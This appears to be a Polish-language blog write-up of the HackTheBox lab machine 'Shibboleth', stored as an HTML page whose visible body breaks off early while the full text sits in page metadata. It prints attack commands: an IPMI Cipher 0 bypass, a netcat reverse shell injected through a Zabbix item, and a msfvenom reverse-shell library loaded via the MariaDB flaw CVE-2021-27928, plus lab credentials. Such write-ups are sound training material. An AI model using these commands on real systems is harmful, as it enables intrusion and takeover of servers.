<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Shibboleth - HackTheBox | Mateusz Suszczyk</title>
<meta name="keywords" content="Linux, Medium, Retired" />
<meta name="description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)">
<meta name="author" content="Mateusz Suszczyk">
<link rel="canonical" href="https://suszczyk.github.io/posts/hackthebox/shibboleth/" />
<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.92.2" />
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Shibboleth - HackTheBox" />
<meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://suszczyk.github.io/posts/hackthebox/shibboleth/" />
<meta property="og:image" content="https://suszczyk.github.io/thumbnails/Shibboleth.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-25T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-11-25T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/Shibboleth.jpg" />
<meta name="twitter:title" content="Shibboleth - HackTheBox"/>
<meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://suszczyk.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Shibboleth - HackTheBox",
      "item": "https://suszczyk.github.io/posts/hackthebox/shibboleth/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Shibboleth - HackTheBox",
  "name": "Shibboleth - HackTheBox",
  "description": "Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup\u0026rsquo;em :)",
  "keywords": [
    "Linux", "Medium", "Retired"
  ],
  "articleBody": "Shibboleth - 25.11.2021  NMap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -T4 -p- 10.10.11.124 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-25 22:50 CET Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.059s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: FlexStart Bootstra  FeroxBuster feroxbuster -u http://shibboleth.htb -w /opt/SecLists/Discovery/Web-Content/common.txt -t 50 -x html php -s 200 301 302 ────────────────────────────────────────────────── 301 9l 28w 317c http://shibboleth.htb/assets 200 426l 1341w 19196c http://shibboleth.htb/blog.html 301 9l 28w 316c http://shibboleth.htb/forms 301 9l 28w 321c http://shibboleth.htb/assets/css 200 1323l 4114w 59474c http://shibboleth.htb/index.html 301 9l 28w 321c http://shibboleth.htb/assets/img 200 1l 8w 44c http://shibboleth.htb/forms/contact.php 301 9l 28w 320c http://shibboleth.htb/assets/js 301 9l 28w 326c http://shibboleth.htb/assets/img/blog 301 9l 28w 329c http://shibboleth.htb/assets/img/clients 301 9l 28w 324c http://shibboleth.htb/assets/vendor 301 9l 28w 331c http://shibboleth.htb/assets/img/portfolio 301 9l 28w 326c http://shibboleth.htb/assets/img/team 301 9l 28w 334c http://shibboleth.htb/assets/img/testimonials [####################] - 3m 169092/169092 0s found:14 errors:2557  [####################] - 55s 14091/14091 257/s http://shibboleth.htb [####################] - 1m 14091/14091 199/s http://shibboleth.htb/assets [####################] - 1m 14091/14091 160/s http://shibboleth.htb/forms [####################] - 1m 14091/14091 140/s http://shibboleth.htb/assets/css [####################] - 1m 14091/14091 126/s http://shibboleth.htb/assets/img [####################] - 1m 14091/14091 132/s http://shibboleth.htb/assets/js [####################] - 2m 14091/14091 115/s http://shibboleth.htb/assets/img/blog [####################] - 1m 14091/14091 130/s http://shibboleth.htb/assets/img/clients [####################] - 1m 14091/14091 135/s http://shibboleth.htb/assets/vendor [####################] - 1m 14091/14091 157/s http://shibboleth.htb/assets/img/portfolio [####################] - 1m 14091/14091 190/s http://shibboleth.htb/assets/img/team [####################] - 1m 14091/14091 198/s http://shibboleth.htb/assets/img/testimonials  Nikto  Strona główna  Informacje Framework:\tBootstrap Theme:\tFlexStart - v1.2.0\n forms readme.txt\nFully working PHP/AJAX contact form script is available in the pro version of the template. You can buy it from: https://bootstrapmade.com/flexstart-bootstrap-startup-template/ contact.php\nUnable to load the \"PHP Email Form\" Library!  Nic ciekawego, postanowiłem poszukać dalej.\nDNS Enum gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -o subdomains.txt ┌──(kali㉿kali)-[~/Desktop/shibboleth] └─$ cat subdomains.txt | grep 200 Found: monitor.shibboleth.htb (Status: 200) [Size: 3686] Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686] Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686] Found: 2009.shibboleth.htb (Status: 302) [Size: 291] Found: 2008.shibboleth.htb (Status: 302) [Size: 291]  Subdomain monitor  Subdomain zabbix W kodzie źródłowym znalazłem odnośnik, który może sugerować, że to Zabbix 5.0\nMożliwe, że jest nawet jakiś exploit na tą wersje.\nNiestety, exploit jest Authenticated, czyli nie użyjemy go bez danych logowania\n Ponowny nmap Jak się okazało skanowanie nmapem nie ukazało wszystkich portów. Jest jeszcze jeden port UDP, który jest otwarty.\nSkan nmap po portach UDP ┌──(kali㉿kali)-[~] └─$ sudo nmap -sU 10.10.11.124 -v 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 16:20 CET Initiating Ping Scan at 16:20 Scanning 10.10.11.124 [4 ports] Completed Ping Scan at 16:20, 0.00s elapsed (1 total hosts) Initiating UDP Scan at 16:20 Scanning shibboleth.htb (10.10.11.124) [1000 ports] Discovered open port 623/udp on 10.10.11.124 Completed UDP Scan at 16:20, 4.70s elapsed (1000 total ports) Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.015s latency). Not shown: 999 open|filtered ports PORT STATE SERVICE 623/udp open asf-rmcp Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 4.84 seconds Raw packets sent: 2007 (91.767KB) | Rcvd: 7 (284B) Szybki research o 623/udp open asf-rmcp doprowadził mnie do artykułu https://book.hacktricks.xyz/pentesting/623-udp-ipmi\nScan usługi na Metasploit auxiliary/scanner/ipmi/ipmi_version [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) Co oznacza, że jest to wersja 2.0, z artykułu powyżej wynika, że można pozyskać hashe i nazwy użytkowników używając modułu scanner/ipmi/ipmi_dumphashes\n[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:5159ea5d820100001b33743d86c539516a5b8e058377b2f114a0cd0acc976df16cd443adb8eac06fa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:dcc9b2f4db67b8e774dc0c59d1d90ee141a2bb86  Nie udało zcrackować się tego hasha SHA-1. Były to próby słownikiem rockyou.txt. Natomiast jest tutaj podatność  IPMI Authentication Bypass via Cipher 0 (artykuł powyżej).\nListowanie użytkowników ┌──(kali㉿kali)-[~/Desktop/shibboleth] └─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user list #Use Cipher 0 to dump a list of users ID Name Callin Link Auth IPMI Msg Channel Priv Limit 1 true false false USER 2 Administrator true false true USER 3 true false false Unknown (0x00) Zmiana hasła użytkownika z id 2 ┌──(kali㉿kali)-[~/Desktop/shibboleth] └─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user set password 2 abc123 #Change the password of root Set User Password command successful (user 2)  John The Ripper Jak się okazało, należało ustawić dodatkowy parametr w Metasploit odnośnie “wyrzucenia” gotowego pliku do crackowania Johnem albo Hashcatem. Lekcja to sprawdzać dokładnie parametry używanego modułu ;)\n┌──(kali㉿kali)-[~] └─$ john yes --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x]) Press 'q' or Ctrl-C to abort, almost any other key for status ilovepumkinpie1 (10.10.11.124 Administrator) 1g 0:00:00:02 DONE (2021-11-29 20:36) 0.4854g/s 3589Kp/s 3589Kc/s 3589KC/s iloveqmc..ilovepino Use the \"--show\" option to display all of the cracked passwords reliably Session completed Zatem mamy pewne dane logowania: Administrator:ilovepumkinpie1\nHasło faktycznie pasuje do Zabbixa\n Payload Tutaj długo szukałem różnych rozwiązań i możliwości. Po pomocy jednego z użytkowników forum znalazłem, że należały stworzyć nowy Item, gdzie można wykonać określoną komendę.\nsystem.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u00261|nc 10.10.14.156 9001 /tmp/f \u0026,nowait] Nasłuchiwanie na porcie 9001, otrzymujemy shell.\n User Z tego poziomu jeszcze nie możemy podejrzeć flagi user.txt.\ncat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin Debian-snmp:x:111:119::/var/lib/snmp:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false Widać, że jest użytkownik ipmi-svc, dla niego spróbowałem wcześniejsze hasło z Zabbixa. Okazało się poprawne.\nZatem:\nsu ipmi-svc ilovepumkinpie1 user.txt\nd8442cbba2b67fe3c65924dea8414603\n Privilege Escalation Netstat netstat -an tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:10050 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:10051 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN Mamy port 3306 czyli MySQL. Sprawdźmy zatem co pokazuje LinPeas.\n LinPEAS Po skończonym skanie, dostrzegłem specyficzną linię w podpunkcie z hasłami. Wygląda to na jakiś plik konfiguracyjny Zabbixa.\n╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files ... /etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh ... Plik okazał się dosyć spory, wobec czego użyłem komendy grep z wyszukaniem linii z hasłem powyżej oraz załączeniem 10 linii w dół oraz w górę.\ncat /etc/zabbix/zabbix_server.conf | grep -A10 -B10 bloooarskybluh # DBUser= DBUser=zabbix ### Option: DBPassword # Database password. # Comment this line if no password is used. # # Mandatory: no # Default: DBPassword=bloooarskybluh ### Option: DBSocket # Path to MySQL socket. # # Mandatory: no # Default: # DBSocket= ### Option: DBPort # Database port when not using local socket. Teraz widać pewne dane dostępowe:\nzabbix:bloooarskybluh\n MariaDB Po wpisaniu otrzymałem dostęp do bazy danych.\nTeraz kilka komend, by odnaleźć jakieś ciekawe informacje w bazie\nSHOW DATABASES; +--------------------+ | Database | +--------------------+ | information_schema | | zabbix | +--------------------+  USE zabbix; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed SELECT * FROM users; +--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+--------------+---------------+---------------+ | userid | alias | name | surname | passwd | url | autologin | autologout | lang | refresh | type | theme | attempt_failed | attempt_ip | attempt_clock | rows_per_page | +--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+--------------+---------------+---------------+ | 1 | Admin | Zabbix | Administrator | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 | | 0 | 0 | en_GB | 60s | 3 | dark-theme | 9 | 10.10.14.141 | 1639337581 | 50 | | 2 | guest | | | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 | | 0 | 15m | en_GB | 30s | 1 | default | 0 | | 0 | 50 | | 3 | Administrator | IPMI Service | Account | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe | | 0 | 0 | en_GB | 60s | 2 | default | 0 | | 0 | 50 | +--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+--------------+---------------+---------------+ Niestety znalezione w bazie hashe nie dają się złamać. Zdaje się, że jest to ślepa uliczka.\n Linux Exploit Suggester Postanowiłem sprawdzić maszynę pod kątem jakichś statycznych podatności. Użyłem do tego Linux Exploit Suggester. Efekt skanu:\nuname -a Linux shibboleth 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux hostnamectl Static hostname: shibboleth Icon name: computer-vm Chassis: vm Machine ID: 13612108a6894baca63a2e86f2062c0e Boot ID: 099c4638771a489b8f976be6db0d8087 Virtualization: vmware Operating System: Ubuntu 20.04.1 LTS Kernel: Linux 5.4.0-89-generic Architecture: x86-64 Z racji, że jest to Ubuntu, postanowiłem sprawdzić najpierw pierwszą podatność, czyli CVE-2021-3156\nJak się okazało poprzez sudoedit -s / można sprawdzić tą podatność. W tym przypadku sudo nie jest podatne. Zatem ponownie ślepa uliczka.\n Powrót do MariaDB Na tym etapie utknąłem i musiałem spytać się jednego z użytkowników o wskazówkę. Jak się okazało, już chwilę wcześniej byłem na drodze do roota. Chodzi o wersję MariaDB oraz podatność CVE-2021-27928\nServer version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Wersja 10.3.25 jest podatna na Command Injection.\nhttps://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html\nZgodnie z Proof of Concept stworzyłem najpierw plik w msfvenom\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.174 LPORT=9002 -f elf-so -o test.so wget http://10.10.14.174/test.so mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider=\"/tmp/pp/test.so\";' bloooarskybluh I podczas nasłuchiwania na porcie 9002 otrzymujemy połączenie\nroot.txt\n9bdfeddc05b1e2c6078d24b9c4a8f756\n",
  "wordCount" : "1442",
  "inLanguage": "en",
  "image":"https://suszczyk.github.io/thumbnails/Shibboleth.jpg","datePublished": "2021-11-25T00:00:00Z",
  "dateModified": "2021-11-25T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Mateusz Suszczyk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://suszczyk.github.io/posts/hackthebox/shibboleth/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Mateusz Suszczyk",
    "logo": {
      "@type": "ImageObject",
      "url": "https://suszczyk.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
                    <span>Archiwum</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
                    <span>Kategorie</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/tags/" title="Tagi">
                    <span>Tagi</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/search/" title="Szukaj">
                    <span>Szukaj</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Shibboleth - HackTheBox
    </h1>
    <div class="post-meta"><span title='2021-11-25 00:00:00 +0000 UTC'>November 25, 2021</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Mateusz Suszczyk

</div>
  </header> 
<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/Shibboleth.jpg" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#shibboleth---25112021" aria-label="Shibboleth - 25.11.2021">Shibboleth - 25.11.2021</a></li>
                <li>
                    <a href="#nmap" aria-label="NMap">NMap</a></li>
                <li>
                    <a href="#feroxbuster" aria-label="FeroxBuster">FeroxBuster</a></li>
                <li>
                    <a href="#nikto" aria-label="Nikto">Nikto</a></li>
                <li>
                    <a href="#strona-g%c5%82%c3%b3wna" aria-label="Strona główna">Strona główna</a><ul>
                        
                <li>
                    <a href="#informacje" aria-label="Informacje">Informacje</a></li>
                <li>
                    <a href="#forms" aria-label="forms">forms</a></li></ul>
                </li>
                <li>
                    <a href="#dns-enum" aria-label="DNS Enum">DNS Enum</a><ul>
                        
                <li>
                    <a href="#subdomain-monitor" aria-label="Subdomain monitor">Subdomain monitor</a></li>
                <li>
                    <a href="#subdomain-zabbix" aria-label="Subdomain zabbix">Subdomain zabbix</a></li></ul>
                </li>
                <li>
                    <a href="#ponowny-nmap" aria-label="Ponowny nmap">Ponowny nmap</a><ul>
                        <ul>
                        
                <li>
                    <a href="#skan-nmap-po-portach-udp" aria-label="Skan nmap po portach UDP">Skan nmap po portach UDP</a></li></ul>
                    
                <li>
                    <a href="#scan-us%c5%82ugi-na-metasploit-auxiliaryscanneripmiipmi_version" aria-label="Scan usługi na Metasploit auxiliary/scanner/ipmi/ipmi_version">Scan usługi na Metasploit <code>auxiliary/scanner/ipmi/ipmi_version</code></a><ul>
                        
                <li>
                    <a href="#listowanie-u%c5%bcytkownik%c3%b3w" aria-label="Listowanie użytkowników">Listowanie użytkowników</a></li>
                <li>
                    <a href="#zmiana-has%c5%82a-u%c5%bcytkownika-z-id-2" aria-label="Zmiana hasła użytkownika z id 2">Zmiana hasła użytkownika z id 2</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#john-the-ripper" aria-label="John The Ripper">John The Ripper</a></li>
                <li>
                    <a href="#payload" aria-label="Payload">Payload</a></li>
                <li>
                    <a href="#user" aria-label="User">User</a></li>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
                        
                <li>
                    <a href="#netstat" aria-label="Netstat">Netstat</a></li>
                <li>
                    <a href="#linpeas" aria-label="LinPEAS">LinPEAS</a></li>
                <li>
                    <a href="#mariadb" aria-label="MariaDB">MariaDB</a></li>
                <li>
                    <a href="#linux-exploit-suggester" aria-label="Linux Exploit Suggester">Linux Exploit Suggester</a></li>
                <li>
                    <a href="#powr%c3%b3t-do-mariadb" aria-label="Powrót do MariaDB">Powrót do MariaDB</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="shibboleth---25112021">Shibboleth - 25.11.2021<a hidden class="anchor" aria-hidden="true" href="#shibboleth---25112021">#</a></h1>
<hr>
<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ nmap -sC -sV -T4 -p- 10.10.11.124  
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-11-25 22:50 CET
Nmap scan report <span style="color:#66d9ef">for</span> shibboleth.htb <span style="color:#f92672">(</span>10.10.11.124<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65534</span> filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: FlexStart Bootstra
</code></pre></div><hr>
<h1 id="feroxbuster">FeroxBuster<a hidden class="anchor" aria-hidden="true" href="#feroxbuster">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">feroxbuster -u http://shibboleth.htb -w /opt/SecLists/Discovery/Web-Content/common.txt -t <span style="color:#ae81ff">50</span> -x html php -s <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">301</span> <span style="color:#ae81ff">302</span>

──────────────────────────────────────────────────                                                                                                           
<span style="color:#ae81ff">301</span>        9l       28w      317c http://shibboleth.htb/assets                                                                                               
<span style="color:#ae81ff">200</span>      426l     1341w    19196c http://shibboleth.htb/blog.html                                                                                            
<span style="color:#ae81ff">301</span>        9l       28w      316c http://shibboleth.htb/forms                                                                                                
<span style="color:#ae81ff">301</span>        9l       28w      321c http://shibboleth.htb/assets/css                                                                                           
<span style="color:#ae81ff">200</span>     1323l     4114w    59474c http://shibboleth.htb/index.html                                                                                           
<span style="color:#ae81ff">301</span>        9l       28w      321c http://shibboleth.htb/assets/img                                                                                           
<span style="color:#ae81ff">200</span>        1l        8w       44c http://shibboleth.htb/forms/contact.php                                                                                    
<span style="color:#ae81ff">301</span>        9l       28w      320c http://shibboleth.htb/assets/js                                                                                            
<span style="color:#ae81ff">301</span>        9l       28w      326c http://shibboleth.htb/assets/img/blog                                                                                      
<span style="color:#ae81ff">301</span>        9l       28w      329c http://shibboleth.htb/assets/img/clients                                                                                   
<span style="color:#ae81ff">301</span>        9l       28w      324c http://shibboleth.htb/assets/vendor
<span style="color:#ae81ff">301</span>        9l       28w      331c http://shibboleth.htb/assets/img/portfolio
<span style="color:#ae81ff">301</span>        9l       28w      326c http://shibboleth.htb/assets/img/team
<span style="color:#ae81ff">301</span>        9l       28w      334c http://shibboleth.htb/assets/img/testimonials
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 3m    169092/169092  0s      found:14      errors:2557   </span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 55s    14091/14091   257/s   http://shibboleth.htb</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   199/s   http://shibboleth.htb/assets</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   160/s   http://shibboleth.htb/forms</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   140/s   http://shibboleth.htb/assets/css</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   126/s   http://shibboleth.htb/assets/img</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   132/s   http://shibboleth.htb/assets/js</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 2m     14091/14091   115/s   http://shibboleth.htb/assets/img/blog</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   130/s   http://shibboleth.htb/assets/img/clients</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   135/s   http://shibboleth.htb/assets/vendor</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   157/s   http://shibboleth.htb/assets/img/portfolio</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   190/s   http://shibboleth.htb/assets/img/team</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     14091/14091   198/s   http://shibboleth.htb/assets/img/testimonials</span>
</code></pre></div><hr>
<h1 id="nikto">Nikto<a hidden class="anchor" aria-hidden="true" href="#nikto">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
</code></pre></div><hr>
<h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211125224918.png" alt=""  />
</p>
<hr>
<h2 id="informacje">Informacje<a hidden class="anchor" aria-hidden="true" href="#informacje">#</a></h2>
<p>Framework:	Bootstrap
Theme:	FlexStart - v1.2.0</p>
<hr>
<h2 id="forms">forms<a hidden class="anchor" aria-hidden="true" href="#forms">#</a></h2>
